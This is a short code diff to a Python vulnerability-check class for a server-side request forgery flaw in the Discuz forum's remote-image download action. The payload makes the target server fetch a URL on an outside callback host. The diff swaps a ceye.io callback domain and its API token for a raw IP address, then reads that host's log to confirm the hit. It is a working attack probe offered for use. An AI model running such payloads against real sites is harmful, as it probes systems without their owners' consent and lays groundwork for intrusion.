@@ -25,11 +25,11 @@ class discuz_forum_message_ssrf_BaseVerify:
         time_stamp = time.mktime(datetime.datetime.now().timetuple())
         m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
         md5_str = m.hexdigest()
-        payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://dx3hbm.ceye.io/"+md5_str+".jpg[/img]&formhash=09cec465"
+        payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/"+md5_str+".jpg[/img]&formhash=09cec465"
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            eye_url = "http://api.ceye.io/v1/records?token=c04665a158430a100ed655f9c710e597&type=request"
+            eye_url = "http://45.76.158.91/web.log"
             time.sleep(6)
             reqr = requests.get(eye_url, timeout=10, verify=False)
             if md5_str in reqr.text:
